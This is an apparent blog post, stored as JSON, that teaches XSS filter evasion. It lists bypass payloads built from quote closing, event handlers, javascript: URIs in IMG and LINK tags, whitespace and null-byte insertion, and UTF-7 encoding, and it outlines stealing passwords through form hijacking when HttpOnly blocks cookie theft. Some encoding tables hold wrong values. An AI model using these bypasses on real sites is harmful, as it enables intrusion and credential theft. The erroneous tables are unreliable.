{"title":"xss过滤的那些事","uid":"42f7b323120f691383c67796cc3bfd08","slug":"xss过滤的那些事","date":"2022-02-22T09:20:10.000Z","updated":"2022-05-30T14:42:00.129Z","comments":true,"path":"api/articles/xss过滤的那些事.json","keywords":null,"cover":null,"content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"\\assets\\js\\Meting.min.js\"></script><h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>由于实战当中避免不了拦截xss跨站攻击，由此需要了解过滤xss的方式有哪些，以及去如何绕过。</p>\n<h2 id=\"Http-Only\"><a href=\"#Http-Only\" class=\"headerlink\" title=\"Http Only\"></a>Http Only</h2><p><code>HttpOnly</code>是包含在http返回头<code>Set-Cookie</code>里面的一个附加的flag，所以它是后端服务器对cookie设置的一个附加的属性，在生成cookie时使用<code>HttpOnly</code>标志有助于减轻客户端脚本访问受保护cookie的风险（如果浏览器支持的话）。<br>通过js脚本将无法读取到cookie信息，这样能<strong>有效的防止XSS攻击</strong>。</p>\n<p>简单来说就是：如果在cookie中设置了HttpOnly属性，那么通过js脚本将无法读取到cookie信息。</p>\n<p><strong>注</strong>：这里要明确的一点是，Http Only是防止xss读取cookie，不阻止xss语句。</p>\n<h2 id=\"Http-Only绕过思路\"><a href=\"#Http-Only绕过思路\" class=\"headerlink\" title=\"Http Only绕过思路\"></a>Http Only绕过思路</h2><p>一般获取后台权限无非是通过获取cookie进入后台，或者是直接账号密码登录。由于网站启用<code>Http Only</code>无法获取cookie的情况下 ，只能通过获取账号密码进行登录。</p>\n<p>1、<strong>保存账号密码</strong>：网站管理员可能设置浏览器保存账号密码，这样的情况下可以通过xss获取保存的账号密码。</p>\n<p>2、<strong>未保存账号密码-表单劫持</strong>：后台管理员在输入账号密码的同时，触发<code>跨站语句</code>，账号密码既发送给服务端，又发送给攻击者。（一般是在登录框页面触发xss语句，若xss语句未在登录框触发，这种方式是不可行的）</p>\n<h2 id=\"代码过滤\"><a href=\"#代码过滤\" class=\"headerlink\" title=\"代码过滤\"></a>代码过滤</h2><p><strong>1、转义字符串：</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&lt;INPUT type&#x3D;&quot;text&quot; value&#x3D;&#39;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;&#x2F;SCRIPT&gt;&#39;&gt;\n&#39;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;&#x2F;SCRIPT&gt; 闭合前单引号\n&#39;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;&#x2F;SCRIPT&gt;&lt;xss a&#x3D;&#39; 闭合后单引号\n&lt;INPUT type&#x3D;&quot;text&quot; value&#x3D;&#39;&#39;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;&#x2F;SCRIPT&gt;&lt;xss a&#x3D;&#39;&#39;&gt;\n绕过语句<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><strong>2、绕过单引号过滤：字符实体</strong></p>\n<table>\n<thead>\n<tr>\n<th align=\"center\"><code>&amp;#34;</code></th>\n<th align=\"center\"><code>&amp;quot;</code></th>\n<th align=\"center\"><code>&quot;</code></th>\n<th align=\"center\">双引号</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\"><code>&amp;#38;</code></td>\n<td align=\"center\"><code>&amp;amp;</code></td>\n<td align=\"center\"><code>&amp;</code></td>\n<td align=\"center\">&amp;符号</td>\n</tr>\n<tr>\n<td align=\"center\"><code>&amp;#60;</code></td>\n<td align=\"center\"><code>&amp;lt;</code></td>\n<td align=\"center\"><code>&lt;</code></td>\n<td align=\"center\">小于号</td>\n</tr>\n<tr>\n<td align=\"center\"><code>&amp;#62;</code></td>\n<td align=\"center\"><code>&amp;gt;</code></td>\n<td align=\"center\"><code>&gt;</code></td>\n<td align=\"center\">大于号</td>\n</tr>\n</tbody></table>\n<p>使用<code>&amp;quot;</code>或者<code>&amp;#34;</code>来代替我们的双引号，有时候可以绕过过滤。</p>\n<p><strong>3、绕过<code>&lt;SCRIPT&gt;</code>过滤：</strong><br>有些过滤器会过滤到<code>&lt;script&gt;</code>标签，上面的例子就都废了。那就是用事件处理器进行插入语句，例：</p>\n<p><code>&lt;BODY onload=&quot;alert(&#39;XSS&#39;)&quot;&gt;</code></p>\n<p>在 html 里啊。这个 <code>Onload</code> 关键字就是一个事件，其他的所有标签都没有这个属性，但是 <code>Body</code>标签是有的。但是，有一定的局限性，如果 <code>onload事件</code>在你的代码之前已经被处理了。也可以使用其他处理器，根据情况而定。</p>\n<p><strong>4、使用 <code>IMG</code> 源</strong>：<br>Html 中最常用的两个标签 <code>img</code> 和 <code>&lt;a&gt;</code>的<code>href</code>属性 一般是不会过滤的，一个指定图片，一个指定超链接。最危险的是img 标签。例：</p>\n<p><code>&lt;IMG SRC=&quot;javascript:alert(&#39;XSS&#39;);&quot;&gt;</code></p>\n<p><strong>5、使用制表符, 换行符和回车符等符号</strong>：</p>\n<p>例：<code>&lt;IMG SRC=&quot;java&amp;#x9ascript:alert(&#39;XSS&#39;);&quot;&gt;</code>，为了漆面过滤器。</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">Type</th>\n<th align=\"center\">Horizontal Tab</th>\n<th align=\"center\">New line</th>\n<th align=\"center\">Carriage Return</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">URL</td>\n<td align=\"center\"><code>%09</code></td>\n<td align=\"center\"><code>%10</code></td>\n<td align=\"center\"><code>%13</code></td>\n</tr>\n<tr>\n<td align=\"center\">Minimal Sized Hex</td>\n<td align=\"center\"><code>&amp;#x9</code></td>\n<td align=\"center\"><code>&amp;#xA</code></td>\n<td align=\"center\"><code>&amp;#xD</code></td>\n</tr>\n<tr>\n<td align=\"center\">Maximum Sized Hex</td>\n<td align=\"center\"><code>&amp;#x0000009;</code></td>\n<td align=\"center\"><code>&amp;#x000000A;</code></td>\n<td align=\"center\"><code>&amp;#x000000D;</code></td>\n</tr>\n<tr>\n<td align=\"center\">Minimum Sized Decimal</td>\n<td align=\"center\"><code>&amp;#9</code></td>\n<td align=\"center\"><code>&amp;#10</code></td>\n<td align=\"center\"><code>&amp;#13</code></td>\n</tr>\n<tr>\n<td align=\"center\">Maximum Sized Decimal</td>\n<td align=\"center\"><code>&amp;#x0000009;</code></td>\n<td align=\"center\"><code>&amp;#x0000009;</code></td>\n<td align=\"center\"><code>&amp;#x0000009;</code></td>\n</tr>\n</tbody></table>\n<p><strong>空字符</strong>：</p>\n<p><code>&lt;SCR%00IPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;</code></p>\n<p>空字符 (%00) 使得过滤器不能看到完整的 <code>&lt;SCRIPT&gt;</code>,只在 IE 6.0, IE 7.0 可以。</p>\n<p><strong>6、双引号配对的bug</strong>：</p>\n<p>绕过这种过滤就是寻找闭合的标签，然后构造来突破：</p>\n<p>比如：<code>&lt;IMG &quot;&quot;&quot;&gt;&lt;SCRIPT&gt;alert(&#39;XSS&#39;)&lt;/SCRIPT&gt;&quot;&gt;</code></p>\n<p>通常我们认为，img 标签里。前两个引号被认为是一对，什么都不做，下一个引号和最后的匹配，但是事实不是这样。</p>\n<p>结果最终如下：</p>\n<p><code>&lt;img&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&quot;&amp;gt;</code></p>\n<p><strong>7、绕过CSS 过滤器</strong>：</p>\n<p>HTML 标签用来插入 javaScript 很有用，但是 CSS 也是可以。</p>\n<p>把吧XSS 代码放到 LINK 方式引用的 CSS 的 href 属性里面去：</p>\n<p><code>&lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;javascript:alert(&#39;XSS&#39;);&quot;&gt;</code></p>\n<p><strong>8、编码</strong>：</p>\n<p>使用 utf-7 编码可以绕过：</p>\n<p>例：<code>&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;</code></p>\n<p>使用 UTF-7 编码后：</p>\n<p><code>+ADw-script+AD4-alert(+ACI-XSS+ACI-)+ADw-/script+AD4-</code></p>\n<p>然后所有的加号需要被改成<code>%2b</code>，否则会被浏览器识别为连接符：</p>\n<p><code>%2BADw-script%2BAD4-alert%281%29%2BADw-/script%2BAD4-</code></p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">字符</th>\n<th align=\"center\">实体引用</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">空格</td>\n<td align=\"center\">%20</td>\n</tr>\n<tr>\n<td align=\"center\">&#x2F;</td>\n<td align=\"center\">%2F</td>\n</tr>\n<tr>\n<td align=\"center\">%</td>\n<td align=\"center\">%22</td>\n</tr>\n<tr>\n<td align=\"center\">?</td>\n<td align=\"center\">%3F</td>\n</tr>\n<tr>\n<td align=\"center\">+</td>\n<td align=\"center\">%2B</td>\n</tr>\n</tbody></table>\n<h2 id=\"发现XSS漏洞\"><a href=\"#发现XSS漏洞\" class=\"headerlink\" title=\"发现XSS漏洞\"></a>发现XSS漏洞</h2><p>最常用的 XSS 漏洞测试代码：</p>\n<pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\"><span class=\"token operator\">&lt;</span>script<span class=\"token operator\">></span><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"XSS\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>script<span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>当这个代码被注入到输入框或是 url 参数的时候，会成功也可能会失败，如果失败了。也不意味着网站就是安全的，需要继续渗透。</p>\n","text":"前言由于实战当中避免不了拦截xss跨站攻击，由此需要了解过滤xss的方式有哪些，以及去如何绕过。 Http OnlyHttpOnly是包含在http返回头Set-Cookie里面的一个附加的flag，所以它是后端服务器对cookie设置的一个附加的属性，在生成cookie时使用H...","link":"","photos":[],"count_time":{"symbolsCount":"3k","symbolsTime":"3 mins."},"categories":[{"name":"xss","slug":"xss","count":4,"path":"api/categories/xss.json"}],"tags":[{"name":"xss","slug":"xss","count":4,"path":"api/tags/xss.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%89%8D%E8%A8%80\"><span class=\"toc-text\">前言</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Http-Only\"><span class=\"toc-text\">Http Only</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Http-Only%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF\"><span class=\"toc-text\">Http Only绕过思路</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%BB%A3%E7%A0%81%E8%BF%87%E6%BB%A4\"><span class=\"toc-text\">代码过滤</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%8F%91%E7%8E%B0XSS%E6%BC%8F%E6%B4%9E\"><span class=\"toc-text\">发现XSS漏洞</span></a></li></ol>","author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"人生","uid":"44cb2462aeef047cd96dfb6cf67ce343","slug":"人生","date":"2022-02-24T04:28:11.000Z","updated":"2022-02-24T09:19:04.778Z","comments":true,"path":"api/articles/人生.json","keywords":null,"cover":null,"text":"随便说说吧有时候发现很多事情，很多东西其实并不是你想的那样，或许这个世界也不是我们想的那样，有人会把世界想的很好，有人会把世界想的很坏，可偏偏世界不好也不坏。曾经老是听别人说什么命运有一部分是掌握在自己手里的，这句话我不否认，也不肯定。这里不得不说命运中含有运气的成分，假如所有人...","link":"","photos":[],"count_time":{"symbolsCount":"1.1k","symbolsTime":"1 mins."},"categories":[{"name":"人生感悟","slug":"人生感悟","count":1,"path":"api/categories/人生感悟.json"}],"tags":[{"name":"人生感悟","slug":"人生感悟","count":1,"path":"api/tags/人生感悟.json"}],"author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"xss跨站-xss-labs","uid":"b564e09de39e303e8a190e6bd2a14088","slug":"xss跨站-xss-labs","date":"2022-02-21T14:58:27.000Z","updated":"2022-05-30T14:43:32.587Z","comments":true,"path":"api/articles/xss跨站-xss-labs.json","keywords":null,"cover":[],"text":"[TOC] 前言记录一下xss靶场，xss-labs通关过程。 ##Level-1（无过滤） ###0x00 可以看到给的提示是payload长度为4，地址栏中get方式的name&#x3D;test与欢迎用户test相对应，试着改一下name的参数值。 0x01修改为test&...","link":"","photos":[],"count_time":{"symbolsCount":"7.3k","symbolsTime":"7 mins."},"categories":[{"name":"xss","slug":"xss","count":4,"path":"api/categories/xss.json"}],"tags":[{"name":"靶场","slug":"靶场","count":12,"path":"api/tags/靶场.json"},{"name":"xss","slug":"xss","count":4,"path":"api/tags/xss.json"}],"author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}